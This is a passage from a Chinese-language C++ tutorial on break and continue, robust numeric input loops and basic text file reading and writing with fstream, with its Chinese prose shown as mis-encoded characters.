&lt;&lt; &quot;, value: &quot; &lt;&lt; numbers[i] &lt;&lt; std::endl; if (numbers[i] &lt; 0) &#123; found_index = i; std::cout &lt;&lt; &quot;Negative number found at index &quot; &lt;&lt; i &lt;&lt; &quot;. Breaking loop.&quot; &lt;&lt; std::endl; break; // æ‰¾åˆ°ç¬¬ä¸€ä¸ªè´Ÿæ•°ï¼Œç«‹å³è·³å‡º for å¾ªç¯ &#125; &#125; if (found_index != -1) &#123; std::cout &lt;&lt; &quot;The loop was terminated early.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;No negative number found in the array.&quot; &lt;&lt; std::endl; &#125; // æ¼”ç¤ºåœ¨åµŒå¥—å¾ªç¯ä¸­çš„ä½œç”¨ std::cout &lt;&lt; &quot;\\nNested loop example:&quot; &lt;&lt; std::endl; for (int i = 1; i &lt;= 3; ++i) &#123; for (int j = 1; j &lt;= 3; ++j) &#123; if (i == 2 &amp;&amp; j == 2) &#123; std::cout &lt;&lt; &quot;Breaking inner loop at i=&quot; &lt;&lt; i &lt;&lt; &quot;, j=&quot; &lt;&lt; j &lt;&lt; std::endl; break; // åªè·³å‡ºå†…å±‚å¾ªç¯ (j å¾ªç¯) &#125; std::cout &lt;&lt; &quot;i=&quot; &lt;&lt; i &lt;&lt; &quot;, j=&quot; &lt;&lt; j &lt;&lt; std::endl; &#125; // break åï¼Œæ§åˆ¶æµä¼šåˆ°è¾¾è¿™é‡Œï¼Œç»§ç»­å¤–å±‚å¾ªç¯çš„ä¸‹ä¸€æ¬¡è¿­ä»£ std::cout &lt;&lt; &quot;End of inner loop for i=&quot; &lt;&lt; i &lt;&lt; std::endl; &#125; return 0;&#125; ä»£ç è§£é‡Š: ç¬¬ä¸€ä¸ªå¾ªç¯éå† numbers æ•°ç»„ã€‚å½“ i ä¸º 3 æ—¶ï¼Œnumbers[3] æ˜¯ -2ï¼Œæ»¡è¶³ if æ¡ä»¶ã€‚found_index è¢«è®¾ä¸º 3ï¼Œæ‰“å°æ¶ˆæ¯ï¼Œç„¶å break è¯­å¥è¢«æ‰§è¡Œï¼Œç«‹å³ç»ˆæ­¢ for å¾ªç¯ã€‚åé¢çš„å…ƒç´ ï¼ˆ8 å’Œ -5ï¼‰ä¸ä¼šè¢«æ£€æŸ¥ã€‚ åœ¨åµŒå¥—å¾ªç¯ç¤ºä¾‹ä¸­ï¼Œå½“ i ä¸º 2 ä¸” j ä¸º 2 æ—¶ï¼Œbreak è¯­å¥æ‰§è¡Œã€‚å®ƒåªç»ˆæ­¢äº†æœ€å†…å±‚çš„ j å¾ªç¯ã€‚å¤–å±‚çš„ i å¾ªç¯ç»§ç»­æ‰§è¡Œå…¶ä¸‹ä¸€æ¬¡è¿­ä»£ï¼ˆå½“ i ä¸º 3 æ—¶ï¼‰ã€‚ 6.6.2 continue è¯­å¥continue è¯­å¥ç”¨äºè·³è¿‡å½“å‰å¾ªç¯è¿­ä»£ä¸­å‰©ä½™çš„ä»£ç ï¼Œå¹¶ç«‹å³å¼€å§‹ä¸‹ä¸€æ¬¡è¿­ä»£ã€‚ä¸ break ä¸åŒï¼Œcontinue ä¸ä¼šç»ˆæ­¢æ•´ä¸ªå¾ªç¯ã€‚ ç”¨æ³•: åœ¨ while å’Œ do while å¾ªç¯ä¸­: æ§åˆ¶æµè·³è½¬åˆ°å¾ªç¯æ¡ä»¶çš„åˆ¤æ–­å¤„ã€‚ åœ¨ for å¾ªç¯ä¸­: æ§åˆ¶æµé¦–å…ˆè·³è½¬åˆ° for å¾ªç¯çš„æ›´æ–°è¡¨è¾¾å¼ï¼ˆä¾‹å¦‚ ++iï¼‰ï¼Œç„¶åè·³è½¬åˆ°å¾ªç¯æ¡ä»¶çš„åˆ¤æ–­å¤„ã€‚ ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;int main() &#123; // æ‰“å° 1 åˆ° 10 ä¹‹é—´çš„å¥‡æ•° std::cout &lt;&lt; &quot;Odd numbers between 1 and 10:&quot; &lt;&lt; std::endl; for (int i = 1; i &lt;= 10; ++i) &#123; if (i % 2 == 0) &#123; // å¦‚æœ i æ˜¯å¶æ•° continue; // è·³è¿‡æœ¬æ¬¡è¿­ä»£å‰©ä½™çš„éƒ¨åˆ† (cout è¯­å¥)ï¼Œç›´æ¥è¿›è¡Œä¸‹ä¸€æ¬¡è¿­ä»£ (i++) &#125; // åªæœ‰å½“ i æ˜¯å¥‡æ•°æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œè¿™è¡Œä»£ç  std::cout &lt;&lt; i &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; // è¾“å‡º: 1 3 5 7 9 // æ¼”ç¤ºåœ¨ while å¾ªç¯ä¸­ std::cout &lt;&lt; &quot;\\nSkipping number 5 in while loop (1 to 7):&quot; &lt;&lt; std::endl; int k = 0; while (k &lt; 7) &#123; k++; // å…ˆé€’å¢ k if (k == 5) &#123; std::cout &lt;&lt; &quot;(Skipping 5) &quot;; continue; // è·³è¿‡æœ¬æ¬¡è¿­ä»£çš„ cout &#125; std::cout &lt;&lt; k &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; // è¾“å‡º: 1 2 3 4 (Skipping 5) 6 7 return 0;&#125; ä»£ç è§£é‡Š: åœ¨ for å¾ªç¯ä¸­ï¼Œå½“ i æ˜¯å¶æ•°æ—¶ï¼ˆi % 2 == 0 ä¸ºçœŸï¼‰ï¼Œcontinue è¯­å¥æ‰§è¡Œã€‚å®ƒè·³è¿‡äº† std::cout &lt;&lt; i &lt;&lt; &quot; &quot;; è¿™è¡Œä»£ç ï¼Œç›´æ¥æ‰§è¡Œæ›´æ–°è¡¨è¾¾å¼ ++iï¼Œç„¶ååˆ¤æ–­å¾ªç¯æ¡ä»¶ i &lt;= 10ã€‚å› æ­¤ï¼Œåªæœ‰å¥‡æ•°è¢«æ‰“å°å‡ºæ¥ã€‚ åœ¨ while å¾ªç¯ä¸­ï¼Œå½“ k é€’å¢åˆ° 5 æ—¶ï¼Œif æ¡ä»¶æ»¡è¶³ï¼Œcontinue æ‰§è¡Œï¼Œè·³è¿‡äº† std::cout &lt;&lt; k &lt;&lt; &quot; &quot;;ï¼Œç›´æ¥å›åˆ° while (k &lt; 7) çš„æ¡ä»¶åˆ¤æ–­ã€‚ æ€»ç»“ break: å®Œå…¨ç»ˆæ­¢æœ€å†…å±‚çš„å¾ªç¯æˆ– switchã€‚ continue: è·³è¿‡å½“å‰å¾ªç¯è¿­ä»£çš„å‰©ä½™éƒ¨åˆ†ï¼Œè¿›å…¥ä¸‹ä¸€æ¬¡è¿­ä»£ï¼ˆå¦‚æœå¾ªç¯æ¡ä»¶å…è®¸ï¼‰ã€‚ è¿™ä¸¤ä¸ªè¯­å¥å¯ä»¥ä½¿å¾ªç¯æ§åˆ¶æ›´åŠ çµæ´»ï¼Œä½†è¿‡åº¦ä½¿ç”¨å¯èƒ½ä¼šé™ä½ä»£ç çš„å¯è¯»æ€§ã€‚é€šå¸¸ï¼Œå¯ä»¥é€šè¿‡è°ƒæ•´å¾ªç¯æ¡ä»¶æˆ–ä½¿ç”¨ if è¯­å¥æ¥é¿å…ä¸€äº›ä¸å¿…è¦çš„ break æˆ– continueã€‚ 6.7 è¯»å–æ•°å­—çš„å¾ªç¯åœ¨ C++ ç¨‹åºä¸­ï¼Œç»å¸¸éœ€è¦ç¼–å†™å¾ªç¯æ¥è¯»å–ç”¨æˆ·çš„æ•°å­—è¾“å…¥ï¼Œç›´åˆ°æ»¡è¶³æŸä¸ªæ¡ä»¶ï¼ˆä¾‹å¦‚è¾“å…¥ç‰¹å®šå€¼æˆ–é‡åˆ°æ— æ•ˆè¾“å…¥ï¼‰ä¸ºæ­¢ã€‚ç„¶è€Œï¼Œå¤„ç†æ•°å­—è¾“å…¥ï¼Œç‰¹åˆ«æ˜¯å¤„ç†æ½œåœ¨çš„é”™è¯¯è¾“å…¥ï¼Œéœ€è¦ä¸€äº›æŠ€å·§ã€‚ åŸºæœ¬çš„æ•°å­—è¯»å–å¾ªç¯ä¸€ä¸ªç®€å•çš„è¯»å–æ•°å­—å¹¶ç´¯åŠ çš„å¾ªç¯å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112131415161718192021#include &lt;iostream&gt;int main() &#123; int sum = 0; int input_number; std::cout &lt;&lt; &quot;Enter numbers to sum (enter a non-number to quit): &quot;; // å°è¯•è¯»å–ä¸€ä¸ªæ•´æ•°ï¼Œå¦‚æœæˆåŠŸï¼Œcin è¿”å› true while (std::cin &gt;&gt; input_number) &#123; sum += input_number; std::cout &lt;&lt; &quot;Current sum: &quot; &lt;&lt; sum &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Enter next number: &quot;; &#125; // å½“è¾“å…¥éæ•°å­—æ—¶ï¼Œå¾ªç¯ç»“æŸ std::cout &lt;&lt; &quot;\\nLoop terminated.&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Final sum: &quot; &lt;&lt; sum &lt;&lt; std::endl; return 0;&#125; å·¥ä½œæ–¹å¼: std::cin &gt;&gt; input_number å°è¯•ä»è¾“å…¥æµä¸­è¯»å–ä¸€ä¸ªæ•´æ•°å¹¶å­˜å‚¨åˆ° input_number ä¸­ã€‚ è¿™ä¸ªè¡¨è¾¾å¼æœ¬èº«ä¼šè¿”å› std::cin å¯¹è±¡ã€‚åœ¨éœ€è¦å¸ƒå°”å€¼çš„ä¸Šä¸‹æ–‡ä¸­ï¼ˆå¦‚ while çš„æ¡ä»¶ï¼‰ï¼Œstd::cin å¯¹è±¡ä¼šæ ¹æ®æµçš„çŠ¶æ€è½¬æ¢ä¸º true æˆ– falseã€‚ å¦‚æœæˆåŠŸè¯»å–ä¸€ä¸ªæ•´æ•°ï¼ŒæµçŠ¶æ€æ˜¯æ­£å¸¸çš„ï¼Œstd::cin è½¬æ¢ä¸º trueï¼Œå¾ªç¯ä½“æ‰§è¡Œã€‚ å¦‚æœç”¨æˆ·è¾“å…¥äº†éæ•°å­—ï¼ˆä¾‹å¦‚è¾“å…¥ â€œhelloâ€ æˆ–æŒ‰ Ctrl+Z/Ctrl+D è¡¨ç¤ºæ–‡ä»¶ç»“æŸï¼‰ï¼Œstd::cin &gt;&gt; input_number ä¼šå¤±è´¥ã€‚æ­¤æ—¶ï¼Œstd::cin ä¼šè¿›å…¥â€œå¤±è´¥â€ï¼ˆfailï¼‰çŠ¶æ€ï¼Œè½¬æ¢ä¸º falseï¼Œå¾ªç¯ç»ˆæ­¢ã€‚ å¤„ç†é”™è¯¯è¾“å…¥ä¸Šé¢çš„ç®€å•å¾ªç¯åœ¨é‡åˆ°éæ•°å­—è¾“å…¥æ—¶ä¼šç»ˆæ­¢ï¼Œä½†å®ƒæ²¡æœ‰æ˜ç¡®åœ°å¤„ç†é”™è¯¯çŠ¶æ€ã€‚å¦‚æœå¾ªç¯ç»“æŸåè¿˜éœ€è¦ç»§ç»­ä» std::cin è¯»å–å…¶ä»–ç±»å‹çš„è¾“å…¥ï¼Œå°±éœ€è¦æ¸…é™¤é”™è¯¯çŠ¶æ€å¹¶ä¸¢å¼ƒæ— æ•ˆçš„è¾“å…¥ã€‚ é—®é¢˜: å½“ std::cin &gt;&gt; input_number å¤±è´¥æ—¶ï¼Œè¾“å…¥æµ std::cin ä¼šè®¾ç½®ä¸€ä¸ªé”™è¯¯æ ‡å¿—ï¼ˆfailbitï¼‰ï¼Œå¹¶ä¸”å¯¼è‡´å¤±è´¥çš„è¾“å…¥ï¼ˆä¾‹å¦‚ â€œhelloâ€ï¼‰ä»ç„¶ç•™åœ¨è¾“å…¥ç¼“å†²åŒºä¸­ã€‚å¦‚æœä¸å¤„ç†ï¼Œåç»­çš„ std::cin æ“ä½œé€šå¸¸ä¹Ÿä¼šç«‹å³å¤±è´¥ã€‚ è§£å†³æ–¹æ¡ˆ: æ¸…é™¤é”™è¯¯çŠ¶æ€: ä½¿ç”¨ std::cin.clear() æ–¹æ³•é‡ç½®æµçš„é”™è¯¯æ ‡å¿—ã€‚ å¿½ç•¥æ— æ•ˆè¾“å…¥: ä½¿ç”¨ std::cin.ignore() æ–¹æ³•ä¸¢å¼ƒè¾“å…¥ç¼“å†²åŒºä¸­ä¸éœ€è¦çš„å­—ç¬¦ã€‚é€šå¸¸ä¼šå¿½ç•¥ç›´åˆ°ä¸‹ä¸€ä¸ªæ¢è¡Œç¬¦ \\n æˆ–è¾¾åˆ°æŸä¸ªæœ€å¤§å­—ç¬¦æ•°ã€‚ ç¤ºä¾‹ (æ›´å¥å£®çš„æ•°å­—è¯»å–å¾ªç¯): 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;#include &lt;limits&gt; // éœ€è¦åŒ…å« &lt;limits&gt; æ¥ä½¿ç”¨ numeric_limitsint main() &#123; int sum = 0; int input_number; std::cout &lt;&lt; &quot;Enter numbers to sum (enter a non-number to quit): &quot;; while (true) &#123; // ä½¿ç”¨æ— é™å¾ªç¯ï¼Œå†…éƒ¨å¤„ç†é€€å‡ºæ¡ä»¶ std::cout &lt;&lt; &quot;Enter a number: &quot;; if (std::cin &gt;&gt; input_number) &#123; // æˆåŠŸè¯»å–æ•°å­— sum += input_number; std::cout &lt;&lt; &quot;Current sum: &quot; &lt;&lt; sum &lt;&lt; std::endl; &#125; else &#123; // è¯»å–å¤±è´¥ (è¾“å…¥äº†éæ•°å­—æˆ– EOF) std::cout &lt;&lt; &quot;Invalid input detected or EOF reached.&quot; &lt;&lt; std::endl; // æ£€æŸ¥æ˜¯å¦æ˜¯æ–‡ä»¶ç»“æŸç¬¦ (EOF) if (std::cin.eof()) &#123; std::cout &lt;&lt; &quot;End of file reached. Exiting.&quot; &lt;&lt; std::endl; break; // å¦‚æœæ˜¯ EOFï¼Œç›´æ¥é€€å‡ºå¾ªç¯ &#125; // æ¸…é™¤é”™è¯¯æ ‡å¿—ï¼Œä½¿ cin æ¢å¤æ­£å¸¸ std::cout &lt;&lt; &quot;Clearing error state...&quot; &lt;&lt; std::endl; std::cin.clear(); // ä¸¢å¼ƒç¼“å†²åŒºä¸­å¯¼è‡´é”™è¯¯çš„æ— æ•ˆè¾“å…¥ï¼Œç›´åˆ°æ¢è¡Œç¬¦ std::cout &lt;&lt; &quot;Discarding invalid input...&quot; &lt;&lt; std::endl; std::cin.ignore(std::numeric_limits&lt;std::streamsize&gt;::max(), &#x27;\\n&#x27;); std::cout &lt;&lt; &quot;Please try entering a number again, or press Ctrl+Z/Ctrl+D to exit.&quot; &lt;&lt; std::endl; // æ³¨æ„ï¼šåœ¨è¿™ä¸ªç‰ˆæœ¬ä¸­ï¼Œé‡åˆ°éæ•°å­—è¾“å…¥åï¼Œæˆ‘ä»¬æç¤ºç”¨æˆ·é‡è¯•æˆ–é€€å‡ºï¼Œ // è€Œä¸æ˜¯åƒç¬¬ä¸€ä¸ªä¾‹å­é‚£æ ·ç›´æ¥ç»ˆæ­¢æ±‚å’Œã€‚ // å¦‚æœå¸Œæœ›é‡åˆ°éæ•°å­—å°±é€€å‡ºï¼Œå¯ä»¥åœ¨ else å—çš„æœ«å°¾åŠ ä¸Š break; // break; // å–æ¶ˆæ³¨é‡Šæ­¤è¡Œï¼Œåˆ™é‡åˆ°éæ•°å­—è¾“å…¥æ—¶é€€å‡ºå¾ªç¯ &#125; &#125; std::cout &lt;&lt; &quot;\\nLoop finished.&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Final sum: &quot; &lt;&lt; sum &lt;&lt; std::endl; // å¯ä»¥åœ¨è¿™é‡Œå°è¯•è¯»å–å…¶ä»–è¾“å…¥ï¼Œå› ä¸ºé”™è¯¯çŠ¶æ€å·²è¢«æ¸…é™¤ std::string remaining_input; std::cout &lt;&lt; &quot;\\nEnter some text: &quot;; // éœ€è¦å…ˆå¿½ç•¥æ‰ä¸Šæ¬¡è¾“å…¥ç•™ä¸‹çš„æ¢è¡Œç¬¦ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ if (std::cin.peek() == &#x27;\\n&#x27;) &#123; std::cin.ignore(); &#125; std::getline(std::cin, remaining_input); std::cout &lt;&lt; &quot;You entered: &quot; &lt;&lt; remaining_input &lt;&lt; std::endl; return 0;&#125; ä»£ç è§£é‡Š: ä½¿ç”¨ while(true) åˆ›å»ºä¸€ä¸ªçœ‹ä¼¼æ— é™çš„å¾ªç¯ï¼Œé€€å‡ºé€»è¾‘æ”¾åœ¨å¾ªç¯å†…éƒ¨ã€‚ if (std::cin &gt;&gt; input_number) å°è¯•è¯»å–æ•°å­—ã€‚ å¦‚æœæˆåŠŸï¼Œæ‰§è¡ŒåŠ æ³•ã€‚ å¦‚æœå¤±è´¥ (else å—)ï¼š æ‰“å°é”™è¯¯æ¶ˆæ¯ã€‚ æ£€æŸ¥æ˜¯å¦æ˜¯æ–‡ä»¶ç»“æŸç¬¦ (std::cin.eof())ï¼Œå¦‚æœæ˜¯åˆ™ breakã€‚ è°ƒç”¨ std::cin.clear() æ¸…é™¤ failbit ç­‰é”™è¯¯çŠ¶æ€ã€‚ è°ƒç”¨ std::cin.ignore(...) æ¥ä¸¢å¼ƒç¼“å†²åŒºä¸­çš„æ— æ•ˆè¾“å…¥ã€‚std::numeric_limits&lt;std::streamsize&gt;::max() è¡¨ç¤ºå¿½ç•¥å°½å¯èƒ½å¤šçš„å­—ç¬¦ï¼Œç›´åˆ°é‡åˆ°æ¢è¡Œç¬¦ \\nã€‚è¿™ç¡®ä¿äº†ä¸‹ä¸€æ¬¡å¾ªç¯è¿­ä»£æ—¶ï¼Œstd::cin ä¸ä¼šå†æ¬¡è¯»å–ç›¸åŒçš„æ— æ•ˆè¾“å…¥ã€‚ æ ¹æ®éœ€è¦ï¼Œå¯ä»¥é€‰æ‹© break é€€å‡ºï¼Œæˆ–è€…è®©å¾ªç¯ç»§ç»­ï¼Œæç¤ºç”¨æˆ·é‡æ–°è¾“å…¥ã€‚ è¿™ç§æ¨¡å¼åœ¨éœ€è¦ä»ç”¨æˆ·é‚£é‡Œå¯é åœ°è¯»å–æ•°å­—è¾“å…¥æ—¶éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒèƒ½ä¼˜é›…åœ°å¤„ç†è¾“å…¥é”™è¯¯ï¼Œè€Œä¸æ˜¯è®©ç¨‹åºå› ä¸ºæ„å¤–çš„è¾“å…¥è€Œå´©æºƒæˆ–è¡Œä¸ºå¼‚å¸¸ã€‚ 6.8 ç®€å•æ–‡ä»¶è¾“å…¥/è¾“å‡ºåˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬ä¸»è¦ä½¿ç”¨ cin ä»é”®ç›˜è¯»å–è¾“å…¥ï¼Œç”¨ cout å‘å±å¹•æ˜¾ç¤ºè¾“å‡ºã€‚C++ è¿˜æä¾›äº†å¼ºå¤§çš„åŠŸèƒ½ï¼Œå¯ä»¥è®©æˆ‘ä»¬å°†æ•°æ®å†™å…¥æ–‡ä»¶æˆ–ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®ã€‚è¿™å¯¹äºå­˜å‚¨ç¨‹åºè¿è¡Œç»“æœã€è¯»å–é…ç½®æ–‡ä»¶æˆ–å¤„ç†å¤§é‡æ•°æ®è‡³å…³é‡è¦ã€‚æœ¬èŠ‚å°†ä»‹ç»åŸºæœ¬çš„æ–‡æœ¬æ–‡ä»¶è¾“å…¥/è¾“å‡ºï¼ˆI/Oï¼‰æ“ä½œã€‚ 6.8.1 æ–‡æœ¬ I/O å’Œæ–‡æœ¬æ–‡ä»¶æ–‡ä»¶ I/O ä¸»è¦æœ‰ä¸¤ç§æ¨¡å¼ï¼šæ–‡æœ¬æ¨¡å¼å’ŒäºŒè¿›åˆ¶æ¨¡å¼ã€‚ æ–‡æœ¬æ–‡ä»¶ (Text File): æ–‡æœ¬æ–‡ä»¶å­˜å‚¨çš„æ˜¯äººç±»å¯è¯»çš„å­—ç¬¦åºåˆ—ã€‚æ–‡ä»¶ä¸­çš„æ•°æ®è¢«è§£é‡Šä¸ºå­—ç¬¦ï¼Œæ•°å­—ï¼ˆå¦‚ 123ï¼‰ä¼šè¢«å­˜å‚¨ä¸ºå­—ç¬¦åºåˆ—ï¼ˆ&#39;1&#39;, &#39;2&#39;, &#39;3&#39;ï¼‰ã€‚åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Šï¼Œæ–‡æœ¬æ–‡ä»¶å¯¹è¡Œå°¾çš„å¤„ç†å¯èƒ½ä¸åŒï¼ˆä¾‹å¦‚ï¼ŒWindows ä½¿ç”¨å›è½¦+æ¢è¡Œ \\r\\nï¼ŒUnix/Linux ä½¿ç”¨æ¢è¡Œ \\nï¼‰ã€‚C++ çš„æ–‡æœ¬ I/O ä¼šè‡ªåŠ¨å¤„ç†è¿™äº›è¡Œå°¾è½¬æ¢ï¼Œä½¿å¾—ä»£ç æ›´å…·å¯ç§»æ¤æ€§ã€‚æˆ‘ä»¬é€šå¸¸ä½¿ç”¨ &lt;&lt; å’Œ &gt;&gt; æˆ– getline ç­‰å‡½æ•°æ¥å¤„ç†æ–‡æœ¬æ–‡ä»¶ã€‚ äºŒè¿›åˆ¶æ–‡ä»¶ (Binary File): äºŒè¿›åˆ¶æ–‡ä»¶å­˜å‚¨çš„æ˜¯æ•°æ®çš„åŸå§‹å­—èŠ‚è¡¨ç¤ºã€‚æ•°å­— 123 ä¼šè¢«å­˜å‚¨ä¸ºå…¶åœ¨å†…å­˜ä¸­çš„äºŒè¿›åˆ¶å½¢å¼ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ª 4 å­—èŠ‚çš„ intï¼‰ã€‚äºŒè¿›åˆ¶ I/O ä¸è¿›è¡Œä»»ä½•å­—ç¬¦è½¬æ¢æˆ–è¡Œå°¾å¤„ç†ï¼Œè¯»å†™é€Ÿåº¦é€šå¸¸æ›´å¿«ï¼Œæ–‡ä»¶ä¹Ÿå¯èƒ½æ›´å°ï¼Œä½†å†…å®¹é€šå¸¸ä¸æ˜¯äººç±»ç›´æ¥å¯è¯»çš„ã€‚å¤„ç†äºŒè¿›åˆ¶æ–‡ä»¶é€šå¸¸ä½¿ç”¨ read() å’Œ write() æˆå‘˜å‡½æ•°ã€‚ æœ¬èŠ‚é‡ç‚¹ä»‹ç»æ–‡æœ¬æ–‡ä»¶çš„ I/O æ“ä½œã€‚ 6.8.2 å†™å…¥åˆ°æ–‡æœ¬æ–‡ä»¶ä¸­è¦å°†æ•°æ®å†™å…¥æ–‡æœ¬æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ C++ çš„æ–‡ä»¶æµåº“ &lt;fstream&gt;ã€‚ æ­¥éª¤: åŒ…å«å¤´æ–‡ä»¶: #include &lt;fstream&gt; åˆ›å»º ofstream å¯¹è±¡: ofstream ç±»ï¼ˆoutput file streamï¼‰ç”¨äºå‘æ–‡ä»¶å†™å…¥æ•°æ®ã€‚ä½ éœ€è¦åˆ›å»ºä¸€ä¸ªè¯¥ç±»çš„å¯¹è±¡ï¼Œå¹¶åœ¨åˆ›å»ºæ—¶æˆ–ä¹‹åå°†å…¶ä¸ä¸€ä¸ªæ–‡ä»¶åå…³è”èµ·æ¥ã€‚ 1234std::ofstream outputFile; // åˆ›å»º ofstream å¯¹è±¡outputFile.open(&quot;mydata.txt&quot;); // å°†å¯¹è±¡ä¸æ–‡ä»¶å…³è”ï¼ˆå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºï¼Œå¦‚æœå­˜åœ¨åˆ™æ¸…ç©ºå†…å®¹ï¼‰// æˆ–è€…åœ¨åˆ›å»ºæ—¶ç›´æ¥å…³è”// std::ofstream outputFile(&quot;mydata.txt&quot;); æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€: åœ¨å°è¯•å†™å…¥ä¹‹å‰ï¼Œæœ€å¥½æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€ã€‚å¯ä»¥ä½¿ç”¨ is_open() æ–¹æ³•æˆ–ç›´æ¥æ£€æŸ¥æµå¯¹è±¡çš„çŠ¶æ€ã€‚ 1234if (!outputFile.is_open()) &#123; // æˆ–è€… if (!outputFile) std::cerr &lt;&lt; &quot;Error opening file for writing!&quot; &lt;&lt; std::endl; return 1; // æˆ–è€…è¿›è¡Œå…¶ä»–é”™è¯¯å¤„ç†&#125; å†™å…¥æ•°æ®: ä½¿ç”¨ä¸ cout ç±»ä¼¼çš„ &lt;&lt; è¿ç®—ç¬¦å°†æ•°æ®å†™å…¥æ–‡ä»¶æµã€‚ 123456int year = 2024;double price = 99.99;std::string item = &quot;Gadget&quot;;outputFile &lt;&lt; &quot;Item: &quot; &lt;&lt; item &lt;&lt; std::endl;outputFile &lt;&lt; &quot;Year: &quot; &lt;&lt; year &lt;&lt; std::endl;outputFile &lt;&lt; &quot;Price: &quot; &lt;&lt; price &lt;&lt; std::endl; å…³é—­æ–‡ä»¶: å®Œæˆå†™å…¥åï¼Œåº”è¯¥å…³é—­æ–‡ä»¶ä»¥ç¡®ä¿æ‰€æœ‰æ•°æ®éƒ½è¢«åˆ·æ–°ï¼ˆå†™å…¥ï¼‰åˆ°ç£ç›˜ï¼Œå¹¶é‡Šæ”¾æ–‡ä»¶èµ„æºã€‚å¯ä»¥æ˜¾å¼è°ƒç”¨ close() æ–¹æ³•ï¼Œæˆ–è€…å½“ ofstream å¯¹è±¡ç¦»å¼€å…¶ä½œç”¨åŸŸæ—¶ï¼ˆä¾‹å¦‚å‡½æ•°ç»“æŸï¼‰ï¼Œå…¶ææ„å‡½æ•°ä¼šè‡ªåŠ¨å…³é—­æ–‡ä»¶ã€‚ 1outputFile.close(); // æ˜¾å¼å…³é—­ ç¤ºä¾‹ä»£ç : 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;fstream&gt; // åŒ…å«æ–‡ä»¶æµå¤´æ–‡ä»¶#include &lt;string&gt;int main() &#123; // 1. åˆ›å»º ofstream å¯¹è±¡å¹¶å…³è”æ–‡ä»¶ std::ofstream outFile(&quot;report.txt&quot;); // å°è¯•æ‰“å¼€/åˆ›å»º report.txt // 2. æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€ if (!outFile.is_open()) &#123; std::cerr &lt;&lt; &quot;Could not open report.txt for writing.&quot; &lt;&lt; std::endl; return 1; // è¿”å›é”™è¯¯ç  &#125; // 3. å†™å…¥æ•°æ® std::cout &lt;&lt; &quot;Writing data to report.txt...&quot; &lt;&lt; std::endl; outFile &lt;&lt; &quot;--- Sales Report ---&quot; &lt;&lt; std::endl; outFile &lt;&lt; &quot;Product: Laptop&quot; &lt;&lt; std::endl; outFile &lt;&lt; &quot;Quantity: 15&quot; &lt;&lt; std::endl; outFile &lt;&lt; &quot;Revenue: &quot; &lt;&lt; 15 * 1200.50 &lt;&lt; std::endl; outFile &lt;&lt; &quot;--------------------&quot; &lt;&lt; std::endl; // 4. å…³é—­æ–‡ä»¶ (è™½ç„¶ææ„å‡½æ•°ä¼šè‡ªåŠ¨å…³é—­ï¼Œä½†æ˜¾å¼å…³é—­æ˜¯å¥½ä¹ æƒ¯) outFile.close(); std::cout &lt;&lt; &quot;Data written successfully.&quot; &lt;&lt; std::endl; return 0;&#125; è¿è¡Œæ­¤ç¨‹åºåï¼Œå°†åœ¨ç¨‹åºæ‰€åœ¨çš„ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º report.txt çš„æ–‡ä»¶ï¼ˆå¦‚æœä¸å­˜åœ¨ï¼‰ï¼Œå…¶å†…å®¹å¦‚ä¸‹ï¼š 12345--- Sales Report ---Product: LaptopQuantity: 15Revenue: 18007.5-------------------- 6.8.3 è¯»å–æ–‡æœ¬æ–‡ä»¶ä»æ–‡æœ¬æ–‡ä»¶è¯»å–æ•°æ®ä¸å†™å…¥ç±»ä¼¼ï¼Œä½†ä½¿ç”¨ ifstream ç±»ï¼ˆinput file streamï¼‰ã€‚ æ­¥éª¤: åŒ…å«å¤´æ–‡ä»¶: #include &lt;fstream&gt; åˆ›å»º ifstream å¯¹è±¡: åˆ›å»ºä¸€ä¸ª ifstream å¯¹è±¡å¹¶å°†å…¶ä¸è¦è¯»å–çš„æ–‡ä»¶åå…³è”ã€‚ 1234std::ifstream inputFile; // åˆ›å»º ifstream å¯¹è±¡inputFile.open(&quot;mydata.txt&quot;); // å°†å¯¹è±¡ä¸æ–‡ä»¶å…³è”ä»¥ä¾›è¯»å–// æˆ–è€…åœ¨åˆ›å»ºæ—¶ç›´æ¥å…³è”// std::ifstream inputFile(&quot;mydata.txt&quot;); æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€: åŒæ ·ï¼Œæ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€è‡³å…³é‡è¦ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨æˆ–æ— æ³•è®¿é—®ï¼Œæ‰“å¼€æ“ä½œä¼šå¤±è´¥ã€‚ 1234if (!inputFile.is_open()) &#123; // æˆ–è€… if (!inputFile) std::cerr &lt;&lt; &quot;Error opening file for reading!&quot; &lt;&lt; std::endl; return 1;&#125; è¯»å–æ•°æ®: å¯ä»¥ä½¿ç”¨ä¸ cin ç±»ä¼¼çš„ &gt;&gt; è¿ç®—ç¬¦æ¥è¯»å–ç”±ç©ºæ ¼åˆ†éš”çš„æ•°æ®ï¼Œæˆ–è€…ä½¿ç”¨ std::getline() 